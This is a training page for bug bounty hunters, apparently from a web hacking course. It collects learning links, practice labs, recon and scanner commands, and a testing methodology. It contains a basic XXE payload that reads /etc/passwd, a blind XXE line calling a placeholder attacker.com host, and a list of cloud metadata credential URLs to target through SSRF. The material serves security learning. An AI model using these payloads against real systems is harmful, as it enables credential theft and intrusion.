---
layout: training-page
title: "Bug Bounty Resources — Red Team Academy"
module: "Web Hacking"
tags:
  - bug-bounty
  - web-hacking
  - resources
  - xss
  - ssrf
  - idor
  - recon
page_key: "web-bug-bounty-resources"
render_with_liquid: false
---

# Bug Bounty Resources

A curated collection of platforms, tools, labs, and learning materials for web application security and bug bounty hunting. Covers core vulnerability types with dedicated reading materials, video walkthroughs, and practice environments.

## Core Vulnerability Types

### Cross-Site Scripting (XSS)

```
# Learning Resources
PortSwigger Web Security Academy  — portswigger.net/web-security/cross-site-scripting
OWASP XSS Guide                   — owasp.org/index.php/Cross-site_Scripting_(XSS)
XSS Filter Evasion Cheat Sheet    — cheatsheetseries.owasp.org
The 7 Main XSS Cases (brutelogic)  — brutelogic.com.br/blog/the-7-main-xss-cases-everyone-should-know/

# Practice Labs
PortSwigger XSS Labs     — portswigger.net/web-security/all-labs#cross-site-scripting
XSS Labs by PwnFunction  — xss.pwnfunction.com
Google XSS Game          — xss-game.appspot.com
alert(1) to win          — alf.nu/alert1
prompt(1)                — prompt.ml/0
0l4bs                    — github.com/tegal1337/0l4bs
```

### Cross-Site Request Forgery (CSRF)

```
# Learning Resources
PortSwigger Web Security Academy — portswigger.net/web-security/csrf
CSRF Basics by Princethilak      — princetechhavenz.wordpress.com/2019/12/11/csrf-basics/

# Practice Labs
PortSwigger CSRF Labs            — portswigger.net/web-security/all-labs#cross-site-request-forgery-csrf

# CORS helper
Will it CORS?                    — httptoolkit.tech/will-it-cors/
```

### Insecure Direct Object Reference (IDOR)

```
# Learning Resources
PortSwigger IDOR Guide           — portswigger.net/web-security/access-control/idor
Intigriti IDOR Guide             — blog.intigriti.com/hackademy/idor/

# Key concepts
# - Change numeric IDs in URLs, POST bodies, JSON payloads
# - Test horizontal access (user A accessing user B's data)
# - Test vertical access (regular user accessing admin endpoints)
# - Try GUIDs/UUIDs — sometimes predictable or leaked in API responses
# - Check indirect references via hashed values, encoded IDs

# Practice Labs
PortSwigger IDOR Lab             — portswigger.net/web-security/access-control/lab-insecure-direct-object-references
IDOR on TryHackMe                — tryhackme.com/room/idor
Corridor on TryHackMe            — tryhackme.com/room/corridor
```

### Server-Side Request Forgery (SSRF)

```
# Learning Resources
PortSwigger SSRF Guide           — portswigger.net/web-security/ssrf
OWASP SSRF                       — owasp.org/www-community/attacks/Server_Side_Request_Forgery
SSRF Vulns and Where to Find Them — labs.detectify.com/2022/09/23/ssrf-vulns-and-where-to-find-them/

# Key targets when SSRF is found
http://169.254.169.254/           # AWS EC2 metadata (IMDSv1)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/  # GCP metadata
http://169.254.169.254/metadata/  # Azure metadata (header: Metadata: true)
http://localhost/                  # Internal services
http://127.0.0.1:8080/admin       # Internal admin panels

# Practice Labs
PortSwigger SSRF Labs            — portswigger.net/web-security/all-labs#server-side-request-forgery-ssrf
SSRF Vulnerable Lab              — github.com/incredibleindishell/SSRF_Vulnerable_Lab
TryHackMe: Sea Surfer            — tryhackme.com/room/seasurfer
```

### XML External Entities (XXE)

```
# Learning Resources
PortSwigger XXE Guide            — portswigger.net/web-security/xxe
OWASP XXE Processing             — owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
How to Find XXE Bugs — Luke Stephens (Bugcrowd) — bugcrowd.com/blog/how-to-find-xxe-bugs/

# Basic XXE payload
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

# Blind XXE via out-of-band (OOB)
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/?leak=xxe">]>

# Practice Labs
PortSwigger XXE Labs              — portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection
XXE Lab                           — github.com/jbarone/xxelab
```

## Recon & Asset Discovery Tools

```
# Subdomain Enumeration
subfinder -d target.com -all -o subdomains.txt
amass enum -d target.com -o amass_subs.txt
dnsx -l subdomains.txt -resp -o live_subs.txt

# HTTP Probing
httpx -l subdomains.txt -status-code -title -tech-detect -o live_http.txt

# Directory & File Discovery
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt

# URL Discovery from Wayback Machine
waybackurls target.com | sort -u > wayback_urls.txt
gau target.com | sort -u > gau_urls.txt

# JavaScript Analysis
hakrawler -url https://target.com -depth 3 -plain | sort -u > crawled.txt
# Look for API endpoints, hardcoded keys, hidden paths

# Param Discovery / Content Crawl
meg -d 1000 paths.txt https://target.com
katana -u https://target.com -jc -d 5 -o katana_out.txt
```

## Burp Suite Extensions for Bug Bounty

```
Logger++          — Log all requests/responses from all Burp tools to sortable table
Param Miner       — Discover hidden/unlinked parameters (good for cache poisoning)
AuthMatrix        — Define user roles and test authorization systematically
Autorize          — Automatically test for IDOR/access control bypasses
Burp Bounty       — Build custom scan profiles for specific vulnerability checks

# Install via BApp Store in Burp Professional
# Param Miner usage:
# Right-click request → Guess headers / Guess params → check Intruder results

# Autorize usage:
# Configure low-privilege session cookie in Autorize
# Browse as high-privilege user → Autorize replays each request with low-priv cookie
# Red = bypassed, Yellow = modified response, Green = properly restricted
```

## Vulnerability Scanners

```
# Nuclei — template-based scanner
nuclei -u https://target.com -t nuclei-templates/ -o results.txt
nuclei -l live_hosts.txt -t cves/ -t exposures/ -severity critical,high

# Nikto — web server vulnerability scanner
nikto -h https://target.com

# Reconftw — full automated recon pipeline
./reconftw.sh -d target.com -a   # All modules
./reconftw.sh -d target.com -s   # Subdomain focus
```

## OSINT Search Engines

```
Shodan         — shodan.io              — Internet-connected devices, open ports
Censys         — censys.io              — Certificate transparency, host search
Fofa           — fofa.info              — Internet asset search (Chinese infosec)
FullHunt       — fullhunt.io            — Attack surface discovery
ZoomEye        — zoomeye.org            — Cyberspace component search
hunter.io      — hunter.io              — Email enumeration for organizations
crt.sh         — crt.sh                 — SSL certificate transparency search
SecurityTrails — securitytrails.com     — Historical DNS, WHOIS, subdomains
IntelX         — intelx.io              — Breach data, domains, emails, keys
NerdyData      — nerdydata.com          — Source code search
Wayback Machine — web.archive.org       — Historical page snapshots
```

## Practice Environments

### Free Web Labs

```
PortSwigger Web Security Academy  — portswigger.net/web-security (best for structured learning)
OWASP Juice Shop                  — owasp.org/www-project-juice-shop (download + run locally)
DVWA                              — dvwa.co.uk (classic vulnerable app)
Hacker101 CTF                     — ctf.hacker101.com (earn HackerOne invites)
HackThisSite                      — hackthissite.org
NahamSec TryHackMe Room           — tryhackme.com/room/nahamstore
Google Gruyere                    — google-gruyere.appspot.com
CTFChallenge                      — ctfchallenge.co.uk
```

### Premium Labs

```
PentesterLab     — pentesterlab.com       — Web vulns + code review, structured exercises
TryHackMe        — tryhackme.com          — Guided rooms, web + general hacking
HackTheBox       — hackthebox.eu          — Machines + web challenges
BugBountyHunter  — bugbountyhunter.com    — Platform-specific training
```

## Recon Framework Tools

```
# Reconftw — automates full recon pipeline
git clone https://github.com/six2dez/reconftw
./reconftw.sh -d target.com -a

# Spiderfoot — OSINT automation
pip install spiderfoot
spiderfoot -s target.com -t INTERNET_NAME

# reNgine — web recon suite with configurable pipelines
docker-compose up -d

# AutoRecon — multi-threaded service enum (OSCP-focused)
autorecon 10.10.10.0/24

# Osmedeus — workflow engine for recon
osmedeus scan -f extensive -t target.com
```

## Bug Bounty Methodology

```
# 1. Asset Discovery
subfinder + amass → collect all subdomains
httpx → identify live hosts
nmap → port scan interesting hosts

# 2. Fingerprinting
whatweb / wappalyzer → identify tech stack
nuclei -t technologies/ → version detection

# 3. Manual Recon
Review JS files for API endpoints, keys
Check robots.txt, sitemap.xml, .git/
Review error pages for stack traces

# 4. Vulnerability Testing
Priority: Auth issues > IDOR > SSRF > XSS > SQLi > Info Disclosure

# 5. Reporting
Title: [Vulnerability Type] in [Feature] at [URL]
Severity: CVSS score + business impact
PoC: Step-by-step reproduction
Impact: Data exposed, user affected
Fix: Specific remediation
```

## Resources

- Resources for Beginner Bug Bounty Hunters — `github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters`
- PortSwigger Web Security Academy — `portswigger.net/web-security`
- Bug Bounty Cheat Sheet (EdOverflow) — `github.com/EdOverflow/bugbounty-cheatsheet`
- OWASP Testing Guide v4 — `owasp.org/index.php/OWASP_Testing_Project`
- NahamSec YouTube — `youtube.com/NahamSec`
- Nuclei Templates — `github.com/projectdiscovery/nuclei-templates`
